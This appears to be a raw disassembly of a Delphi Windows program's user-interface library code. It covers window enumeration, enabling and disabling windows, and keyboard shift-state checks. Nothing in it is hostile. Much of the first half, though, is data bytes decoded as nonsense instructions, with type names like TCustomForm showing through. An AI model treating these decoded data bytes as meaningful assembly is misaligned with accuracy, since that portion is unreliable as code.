add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ eax ] al
adc [ eax ] al
nop
dec eax
sub al 0x45
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
sub eax [ ebp ]
or [ ebx ] cl
push esp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
add [ eax ] al
add [ ebx + ebp + 0x45 ] dh
popad
outsb
add [ eax ] al
jb r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
jae r-xdata
jo r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
jae r-xdata
inc esi
outsd
jb r-xdata
outsb
je r-xdata
inc ebx
jb r-xdata
inc esi
outsd
jb r-xdata
mov cl 0x41
add [ eax ] al
pop esp
inc ebp
add [ ebp + ebx * 2 + 0x33800045 ] dh
inc eax
add [ eax ] ah
mov eax 0xec004526
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
sub [ 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x2e
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
inc ebp
add al al
das
inc ebp
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x2d280040 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp ] bl
jbe r-xdata
jo r-xdata
inc ebp
jbe r-xdata
fadd [ ecx + 0xffc0045 ]
inc esp
add [ esp + edi + 0x44 ] dh
inc ebp
add [ eax + 0x3a ] al
inc esp
add [ eax ] dl
mov [ ebx ] sub_43c714
jo r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
jb r-xdata
adc [ eax + 0x6f ] esi
jb r-xdata
lea eax [ eax ]
fsubr [ ecx ]
inc ebp
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
inc esi
outsd
jb r-xdata
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
jae r-xdata
insd
outsd
inc ebp
add [ esi ] al
add [ eax ] al
sub al 0x2b
jae r-xdata
add ah ch
pop es
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ esi ] bh
inc ebp
add [ esi - 0x7ffbad1 ] ch
add al [ eax ]
add [ eax - 0x13ffbada ] bh
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test [ eax * 2 + 0x540a0800 ] ch
dec eax
insb
outsb
je r-xdata
inc esp
add al dh
cmp [ eax + eax - 0x1c ] al
popfd
inc ebp
add [ eax + 0x53 ] ch
inc ebp
add [ eax ] bl
push esi
inc ebp
add ah al
mov es [ ebp ]
add [ edi + 0x45 ] bl
add [ edi + ebx * 2 + 0x45 ] bh
add ah al
mov eax [ 0x5c380045 ]
inc ebp
add al cl
pushfd
inc ebp
add [ eax + 0x7c004583 ] ch
sahf
inc ebp
dec ebp
inc ebp
add [ eax ] dh
test [ ebx ] r-xdata
mov eax cs
inc ebx
add al ah
rol [ ebx ] cl
imul eax [ fs : ebp ] sub_456830
sbb ch dl
inc ebx
add ah bl
imul eax [ ebp ] sub_43f7b4
xchg esp eax
cmp al [ eax + eax + 0x50 ]
cmp eax [ eax + eax + 0x4c ]
inc esp
add [ ebx + edi ] dh
inc esp
add [ ecx + ebx * 2 + 0x45 ] dh
add [ eax + 0x4570 ] al
adc [ eax + eax + 0x44 ] eax
jge r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
outsd
push eax
jb r-xdata
imul ebp [ edi + 0x6e ] 0x700c6c61
sub al [ ebp ]
jae r-xdata
add [ ebp ] 0xbc
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esi + ebx * 2 ] bl
inc ebp
add [ eax + 0x47 ] bh
inc esp
add [ ebx + 0x471c0045 ] cl
inc ecx
add ah bl
pop edi
inc ebp
add [ eax ] bl
pushad
inc ebp
add [ ecx ] ah
inc ebp
add [ edx + edx * 8 + 0x43 ] ch
add [ edx + esi * 4 ] al
inc ecx
add [ ecx + ebp * 2 - 0x511bffbb ] bl
inc ecx
add [ 0x5a740045 ] bh
inc ebp
add [ edx + eax * 2 + 0x47a80044 ] cl
inc esp
add ah dh
inc esi
inc esp
add al cl
mov [ ebx ] sub_443d08
jl r-xdata
mov ah 0x5d
inc ebp
add [ eax + 0x20004033 ] al
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax + 0x69 ] ah
cmp [ ebp + eax * 2 ] bl
enter 0x459c 0x0
test al 0x83
inc ebp
add [ esi + ebx * 4 + 0x45 ] bh
add [ eax + eax * 4 + 0x7f600045 ] ah
inc ebp
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax - 0x24 ] eax
add [ ebp ] r-xdata
je r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] ch
add [ eax ] al
and [ ecx ] ch
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
push esp
sub [ ebp ] eax
add al [ fs : eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add al dl
mov [ ebp ] al
mov ah 0x4d
inc esp
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
sub_452ce0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x2e
inc ebp
add al al
das
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
inc ebp
add [ esi - 0x7ffbad1 ] ch
add al [ eax ]
add [ eax - 0x13ffbada ] bh
mov cl 0x41
add [ eax ] al
pop esp
inc ebp
add [ ebp + ebx * 2 + 0x33800045 ] dh
inc eax
add [ eax ] ah
add [ ebp ] 0xbc
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esi + ebx * 2 ] bl
inc ebp
add [ eax + 0x47 ] bh
inc esp
add [ ebx + 0x471c0045 ] cl
inc ecx
add ah bl
pop edi
inc ebp
add [ eax ] bl
pushad
inc ebp
add [ ecx ] ah
inc ebp
add [ edx + edx * 8 + 0x43 ] ch
add [ edx + esi * 4 ] al
inc ecx
add [ ecx + ebp * 2 - 0x511bffbb ] bl
inc ecx
add [ 0x5a740045 ] bh
inc ebp
add [ edx + eax * 2 + 0x47a80044 ] cl
inc esp
add ah dh
inc esi
inc esp
add al cl
mov [ ebx ] sub_443d08
jl r-xdata
fadd [ ecx + 0xffc0045 ]
inc esp
add [ esp + edi + 0x44 ] dh
inc ebp
add [ eax + 0x3a ] al
inc esp
add [ eax ] dl
mov [ ebx ] sub_43c714
jo r-xdata
inc esp
add al dh
cmp [ eax + eax - 0x1c ] al
popfd
inc ebp
add [ eax + 0x53 ] ch
inc ebp
add [ eax ] bl
push esi
inc ebp
add ah al
mov es [ ebp ]
add [ edi + 0x45 ] bl
add [ edi + ebx * 2 + 0x45 ] bh
add ah al
mov eax [ 0x5c380045 ]
inc ebp
add al cl
pushfd
inc ebp
add [ eax + 0x7c004583 ] ch
sahf
inc ebp
dec ebp
inc ebp
add [ eax ] dh
test [ ebx ] r-xdata
mov eax cs
inc ebx
add al ah
rol [ ebx ] cl
imul eax [ fs : ebp ] sub_456830
sbb ch dl
inc ebx
add ah bl
imul eax [ ebp ] sub_43f7b4
xchg esp eax
cmp al [ eax + eax + 0x50 ]
cmp eax [ eax + eax + 0x4c ]
inc esp
add [ ebx + edi ] dh
inc esp
add [ ecx + ebx * 2 + 0x45 ] dh
add [ eax + 0x4570 ] al
adc [ eax + eax + 0x44 ] eax
jge r-xdata
add [ eax + 0x69 ] ah
cmp [ ebp + eax * 2 ] bl
enter 0x459c 0x0
test al 0x83
inc ebp
add [ esi + ebx * 4 + 0x45 ] bh
add [ eax + eax * 4 + 0x7f600045 ] ah
inc ebp
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax - 0x24 ] eax
add [ ebp ] r-xdata
je r-xdata
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] ch
add [ eax ] al
and [ ecx ] ch
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
push esp
sub [ ebp ] eax
add al [ fs : eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add al dl
mov [ ebp ] al
mov ah 0x4d
inc esp
sub_453205
fadd st7
inc ebx
add [ eax + ecx * 8 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
or al 0x72
inc ebp
add [ esi * 2 + 0x45 ] al
add [ eax + 0x7 ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
inc esp
push esp
inc ebp
add al ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
call 0xffffffffd5443396
cmpsb [ esi ] [ edi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
int3
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
outsd
sub [ ebp ] al
sub [ edx ] eax
add bh bh
cmp [ edx + 0x45 ] dh
add [ esi * 2 + 0x45 ] al
add [ eax + 0x2 ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
popad
jb r-xdata
inc ebp
add [ eax + 0x4565 ] dh
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
test ah dl
inc ebx
add [ esp + edx * 8 + 0x75040043 ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
push 0x65b00045
inc ebp
add [ eax ] al
pop eax
insb
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax + 0x1 ] al
mov al [ 0xffffffffc400443d ]
cmp eax 0x44
outsb
je r-xdata
popad
outsb
adc cl al
inc ecx
add [ eax ] dh
add bh bh
and al 0xd6
inc ebx
add [ eax - 0x2a ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ eax + 0x580043ce ] cl
add [ eax - 0x4fffba98 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
add [ eax ] al
push [ eax ]
add dh bh
test al 0xd5
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
sub al [ ebp ]
sub [ edx ] al
add bh bh
inc ebx
add [ ecx + eax ] ch
inc [ eax + 0x100443d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
inc eax
add [ edi - 0xb00ffff ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al [ ebp ]
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
add al 0x75
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
cmp al 0x28
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
in al dx
test [ ebx ] eax
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
rol [ ecx ] 0xec
add al [ eax ]
inc eax
cmpsb [ esi ] [ edi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
test [ ebx ] eax
outsd
outsb
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x5f00ffff ] ah
cmp eax 0x3dc40044
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
cmp [ edi + 0x740043 ] al
add bh bh
dec esp
stc
inc ebx
add [ ecx ] al
add [ eax ] al
sub_453ed0
mov edi 0xf8ffbdff
test al 0x45
add [ eax ] ah
test eax 0xa9b80045
inc ebp
add [ eax ] dl
stosb [ edi ]
inc ebp
add ah ah
stosb [ edi ]
inc ebp
add ah bh
stosb [ edi ]
inc ebp
add [ edi + 0x45 ] bh
add [ eax - 0x58 ] ah
inc ebp
add ah cl
test al 0x45
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
aas
inc ebp
add [ eax + eax ] cl
je r-xdata
inc eax
inc ebp
add [ eax + eax * 2 + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
inc eax
inc ebp
add [ eax - 0x2c000000 ] ah
sub [ ecx ] eax
in al dx
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
pop eax
lodsd [ esi ]
inc ebp
add [ eax ] al
dec eax
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add ah cl
scasb [ edi ]
inc ecx
add [ eax - 0x23ffbe53 ] bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax ] al
lodsb [ esi ]
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
dec esp
inc eax
inc ebp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
cld
aas
inc ebp
add al dl
sub al [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax ] cl
push esp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xfc00408d
aas
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 2 ] ch
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ edi + edi + 0xc0045 ] ah
or al 0x3f
inc ebp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
stosd [ edi ]
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
sar [ esi + 0x48000045 ] 0x1
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add ah cl
scasb [ edi ]
inc ecx
add [ eax - 0x23ffbe53 ] bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add ah ah
mov esp 0xe0045
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
cmp al 0x0
add [ eax ] al
cld
pop esi
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] ch
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
nop
aam 0x40
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 ] al
inc ebp
add [ eax + 0x41 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
inc ecx
inc ebp
add [ eax + 0x1 ] al
add [ eax ] al
aam 0x29
inc ecx
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
add [ eax + 0x33 ] bh
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
push eax
inc ecx
inc ebp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
int3
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
aam 0x40
inc ebp
add al dl
sub al [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
add [ ecx + rw-data ] ah
retn
sub_454180
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_4541cc
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d8cc
mov eax [ rw-data ]
call sub_41ad1c
mov eax [ rw-data ]
call sub_41acc4
retn
push 0x0
push eax
call ShowOwnedPopups
sub_454204
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026e4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_454254
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_4542f7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4542c0
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_454204
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4542fe
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_454308
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_402704
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_454340
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_4543a4
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_454340
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_454400
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_454420
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_454400
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_45444c
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45aeac
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45b31c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407c0c
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45ae98
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45b308
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407c0c
test eax eax
je r-xdata
sub_4544cc
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_454520
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45455c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_4545a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_454606
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_452164
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040e0
mov eax [ ebp - 0x8 ]
pop edx
call sub_407c0c
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45460d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
sub_454618
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_454640
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_4546b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_454618
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
